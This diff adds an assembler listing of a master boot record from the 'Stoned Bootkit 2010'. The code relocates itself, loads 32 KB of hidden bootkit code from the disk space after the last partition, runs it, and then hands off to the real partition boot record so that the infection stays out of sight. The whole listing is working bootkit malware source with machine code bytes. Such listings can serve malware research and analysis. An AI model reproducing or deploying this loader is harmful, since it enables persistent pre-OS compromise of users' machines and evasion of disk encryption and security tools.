@@ -1,0 +1,269 @@
+     1                                  org 600h
+     2                                  ; reset registers
+     3 00000000 31C0                    xor ax,ax
+     4 00000002 8ED8                    mov ds,ax
+     5 00000004 8EC0                    mov es,ax
+     6 00000006 8ED0                    mov ss,ax
+     7                                  ; set stack to 7C00h
+     8 00000008 BC007C                  mov sp,7C00h 
+     9                                  
+    10                                  ; relocate this bootloader to 0000h:0600h
+    11 0000000B BE007C                  mov si,7C00h
+    12 0000000E BF0006                  mov di,0600h
+    13                                  ; copy 512 bytes
+    14 00000011 B98000                  mov cx,512 / 4                                                                  
+    15                                  
+    16 00000014 FC                      cld
+    17                                   ; copy!
+    18 00000015 F366A5                  rep movsd                                                                      
+    19                                  
+    20 00000018 EA[1D00]0000            jmp word 0000h:Bootkit_Relocated
+    21                                  Bootkit_Relocated:
+    22                                  ; execution starts now from 0000h:0600h
+    23                                  
+    24                                  ; get the RawFS volume start sector
+    25                                  ; eax will hold last partition table sector
+    26 0000001D 6631C0                  xor eax,eax       
+    27                                   ; look-up in the partition table                                                              
+    28 00000020 BE[BE01]                mov si,Partition_Table    
+    29                                    ; 4 Partition Table entries                                                     
+    30 00000023 B104                    mov cl,4                                                                      
+    31                                  
+    32                                  Get_RawFS_Start_Sector:
+    33 00000025 66394408                cmp [si+8],eax  
+    34                                  ; check if Partition is more behind the current one                                                                
+    35 00000029 7208                    jc check_next_partition
+    36                                  
+    37                                  ; if the partition is behind this one, then sector AFTER that partition will be remembered
+    38                                   ; start sector
+    39 0000002B 668B4408                mov eax,[si+8]     
+    40                                    ; + count of sectors (size of partition)                                                            
+    41 0000002F 6603440C                add eax,[si+12]                                                               
+    42                                  
+    43                                  check_next_partition:
+    44                                   ; next Partition Table entry
+    45 00000033 83C610                  add si,16                                                                      
+    46 00000036 E2ED                    loop Get_RawFS_Start_Sector
+    47                                  
+    48 00000038 6609C0                  or eax,eax   
+    49                                     ; not found? (should not occur)                                                                
+    50 0000003B 7410                    jz Boot_Partition
+    51                                  
+    52                                  ; load the bootkit into memory
+    53                                   ; read 32 KB into memory
+    54 0000003D B94000                  mov cx,32*1024 / 512  
+    55                                   ; read to 0000h:7C00h                                                         
+    56 00000040 BB007C                  mov bx,7C00h                                                                   
+    57 00000043 E84300                  call Installation_Check_Read
+    58 00000046 7205                    jc Boot_Partition
+    59                                  
+    60                                  ; EXECUTE THE BOOTKIT
+    61 00000048 EA007E0000              jmp 0000h:7e00h
+    62                                  
+    63                                  Boot_Partition:
+    64                                  
+    65                                  ; find a bootable partition
+    66 0000004D BE[BE01]                mov si,Partition_Table                              ; look-up in the partition table
+    67 00000050 B104                    mov cl,4                                            ; 4 Partition Table entries
+    68                                  
+    69                                  Next_Partition_Table_Entry:
+    70 00000052 803C80                  cmp byte [si],0x80                                  ; active (bootable)?
+    71 00000055 740B                    je Found_Bootable_Partition
+    72 00000057 382C                    cmp [si],ch                                         ; zero? (indicates error)
+    73 00000059 7573                    jnz Error_1
+    74 0000005B 83C610                  add si,16                                           ; seek to next entry
+    75 0000005E E2F2                    loop Next_Partition_Table_Entry
+    76                                  
+    77                                  ; otherwise error - return to BIOS (nice!)
+    78 00000060 CD18                    int 18h
+    79                                  
+    80                                  
+    81                                  Found_Bootable_Partition:
+    82                                  
+    83                                  ; read Partition Bootloader (first sector of partition)
+    84 00000062 668B4408                mov eax,[si+8]                                      ; start sector of partition
+    85 00000066 89E3                    mov bx,sp                                           ; read it to the stack - 7C00h
+    86 00000068 B90100                  mov cx,1                                            ; 1 sector to read
+    87 0000006B E81B00                  call Installation_Check_Read
+    88 0000006E 730A                    jnc Read_Partition_Bootloader
+    89                                  
+    90                                  ; error loading Partition Bootloader - try loading through old Read function
+    91 00000070 8B4C02                  mov cx,[si+0x2]                                     ; sector number (in CHS format) of partition
+    92 00000073 B80102                  mov ax,0x201                                        ; function Read Sectors, 1 sector
+    93 00000076 CD13                    int 0x13
+    94 00000078 726F                    jc Error_2                                          ; if also not working, write out error
+    95                                  
+    96                                  Read_Partition_Bootloader:
+    97                                  
+    98                                  ; verify if it's a valid Bootloader
+    99 0000007A 813EFE7D55AA            cmp word [0x7DFE],0AA55h                            ; verify valid bootloader (check magic number)
+   100 00000080 0F858700                jnz Error_3
+   101                                  
+   102                                  ; execute Partition Boot Record
+   103 00000084 EA007C0000              jmp word 0000h:7C00h
+   104                                  
+   105                                  
+   106                                  
+   107                                  Installation_Check_Read:
+   108                                  
+   109                                  ; make an installation check and support check for hard drive 0
+   110                                  ;   required: available
+   111                                  ;             LBA support (Extended Functions)
+   112                                  ; 
+   113                                  ; cx = count of sectors to read
+   114                                  ; bx = transfer buffer (offset)
+   115                                  ; dl = drive to operate
+   116                                  ; es = transfer buffer (segment)
+   117                                  ; eax = sector number
+   118                                  
+   119 00000089 6660                    pushad                                              ; store register for later usage
+   120 0000008B BBAA55                  mov bx,0x55aa                                       ; fixed parameter
+   121 0000008E B441                    mov ah,0x41                                         ; function Installation Check
+   122 00000090 CD13                    int 0x13
+   123 00000092 7304                    jnc Installation_Check_Successful                   ; CF clear if successful
+   124                                  
+   125                                  Installation_Check_Failed:
+   126 00000094 F9                      stc                                                 ; return with error
+   127 00000095 6661                    popad
+   128                                  
+   129 00000097 C3                      ret
+   130                                  
+   131                                  Installation_Check_Successful:
+   132 00000098 81FB55AA                cmp bx,0AA55h                                       ; BX = AA55h if installed
+   133 0000009C 75F6                    jnz Installation_Check_Failed
+   134 0000009E F6C101                  test cl,00000001b                                   ; bit 0: extended disk access functions (AH=42h-44h,47h,48h) supported
+   135 000000A1 74F1                    jz Installation_Check_Failed
+   136                                  
+   137                                  ; passed
+   138 000000A3 6661                    popad
+   139 000000A5 6660                    pushad
+   140                                  
+   141                                  ; read sectors
+   142 000000A7 6A00                    push word 0                                         ;   qword padding
+   143 000000A9 6A00                    push word 0                                         ;   qword padding
+   144 000000AB 6650                    push eax                                            ;   sector number
+   145 000000AD 06                      push es                                             ;   transfer buffer (segment)
+   146 000000AE 53                      push bx                                             ;   transfer buffer (offset)
+   147 000000AF 51                      push cx                                             ;   number of blocks to transfer
+   148 000000B0 6A10                    push word 10h                                       ;   size of packet = 10h
+   149 000000B2 B442                    mov ah,0x42                                         ; function Extended Read
+   150 000000B4 89E6                    mov si,sp                                           ; disk address packet stored on stack
+   151 000000B6 CD13                    int 0x13                                            ; read the sector[s]!
+   152                                  
+   153 000000B8 61                      popaw
+   154 000000B9 6661                    popad
+   155                                  
+   156 000000BB C3                      ret
+   157                                  
+   158                                  
+   159                                  
+   160                                  Print_Message:
+   161                                  
+   162                                  ; [sp] = Message to display
+   163                                  
+   164 000000BC 5E                      pop si                                              ; return ip = message to display
+   165 000000BD AC                      lodsb                                               ; next character
+   166                                  Endless_Loop:
+   167 000000BE 08C0                    or al,al
+   168 000000C0 74FC                    jz Endless_Loop                                     ; endless loop (if error message => do nothing)
+   169 000000C2 56                      push si                                             ; store message offset for next loop run
+   170 000000C3 1E                      push ds
+   171 000000C4 BB0700                  mov bx,0x7                                          ; foreground color = gray
+   172 000000C7 B40E                    mov ah,0Eh                                          ; function Teletype Output
+   173 000000C9 CD10                    int 0x10
+   174 000000CB 1F                      pop ds
+   175                                  
+   176 000000CC EBEE                    jmp short Print_Message
+   177                                  
+   178                                  
+   179                                  
+   180                                  ; jump to following addresses to print message
+   181                                  
+   182                                  Error_1:
+   183 000000CE E8EBFF                  call Print_Message
+   184 000000D1 496E76616C69642070-     Error_Message_1         db  "Invalid partition table", 0
+   184 000000DA 6172746974696F6E20-
+   184 000000E3 7461626C6500       
+   185                                  
+   186                                  Error_2:
+   187 000000E9 E8D0FF                  call Print_Message
+   188 000000EC 4572726F72206C6F61-     Error_Message_2         db  "Error loading operating system", 0
+   188 000000F5 64696E67206F706572-
+   188 000000FE 6174696E6720737973-
+   188 00000107 74656D00           
+   189                                  
+   190                                  Error_3:
+   191 0000010B E8AEFF                  call Print_Message
+   192 0000010E 4D697373696E67206F-     Error_Message_3         db  "Missing operating system", 0
+   192 00000117 7065726174696E6720-
+   192 00000120 73797374656D00     
+   193                                  
+   194                                  
+   195                                  
+   196                                  ; TrueCrypt message =) [disabled]
+   197                                  ;times 196h-($-$$)   db  0
+   198                                  ;db  " Stoned Bootkit 2010", 0
+   199                                  
+   200                                  
+   201                                  
+   202                                  
+   203                                  ; language descriptions [should be used now but unset!!]
+   204 00000127 00<rept>                times 1B5h-($-$$)   db  0
+   205                                  
+   206                                  ; Microsoft Error linguistic message offsets
+   207 000001B5 2C                      Error_Message_1_length  db  02Ch                  ; *NOT UPDATED*
+   208 000001B6 48                      Error_Message_2_length  db  048h                  ; still bad bad virus writer...
+   209 000001B7 6E                      Error_Message_3_length  db  06Eh                  ; forgot to update error messages...
+   210                                  
+   211                                  
+   212                                  
+   213                                  ; Disk Signature
+   214                                  
+   215                                  times 440-($-$$) db 0
+   216                                  
+   217 000001B8 00000000                Disk_Signature          dd      0       ; required for Windows
+   218 000001BC 0000                                            dw      0       ; drive identification
+   219                                  
+   220                                  
+   221                                  
+   222                                  ; Partition Table (set up for test debugging environment)
+   223                                  
+   224                                  times 1BEh-($-$$) db 0
+   225                                  
+   226                                  
+   227                                  Partition_Table:
+   228                                  
+   229                                  Partition_1
+   230 000001BE 00                          Partition_1_bootable        db      0
+   231 000001BF 000101                      Partition_1_Start_CHS       db      00h, 01h, 01h
+   232 000001C2 04                          Partition_1_Type            db      04h                 ; FAT16
+   233 000001C3 000000                      Partition_1_End_CHS         db      0, 0, 0
+   234 000001C6 3F000000                    Partition_1_Start_LBA       dd      63
+   235 000001CA 003F0000                    Partition_1_Sectors         dd      16128               ; ~ 8 MB
+   236                                  Partition_2
+   237 000001CE 80                          Partition_2_bootable        db      80h                 ; active partition
+   238 000001CF 000000                      Partition_2_Start_CHS       db      0, 0, 0
+   239 000001D2 07                          Partition_2_Type            db      07h                 ; NTFS
+   240 000001D3 000000                      Partition_2_End_CHS         db      0, 0, 0
+   241 000001D6 3F3F0000                    Partition_2_Start_LBA       dd      16128 + 63
+   242 000001DA F89F0000                    Partition_2_Sectors         dd      40952               ; ~ 20 MB
+   243                                  Partition_3
+   244 000001DE 00                          Partition_3_bootable        db      0
+   245 000001DF 000000                      Partition_3_Start_CHS       db      0, 0, 0
+   246 000001E2 00                          Partition_3_Type            db      0
+   247 000001E3 000000                      Partition_3_End_CHS         db      0, 0, 0
+   248 000001E6 00000000                    Partition_3_Start_LBA       dd      0
+   249 000001EA 00000000                    Partition_3_Sectors         dd      0
+   250                                  Partition_4
+   251 000001EE 00                          Partition_4_bootable        db      0
+   252 000001EF 000000                      Partition_4_Start_CHS       db      0, 0, 0
+   253 000001F2 00                          Partition_4_Type            db      0
+   254 000001F3 000000                      Partition_4_End_CHS         db      0, 0, 0
+   255 000001F6 00000000                    Partition_4_Start_LBA       dd      0
+   256 000001FA 00000000                    Partition_4_Sectors         dd      0
+   257                                  
+   258                                  
+   259                                  times 510-($-$$) db 0
+   260                                  
+   261 000001FE 55AA                    Boot_Signature  dw      0AA55h
+   262                                  org 0600h
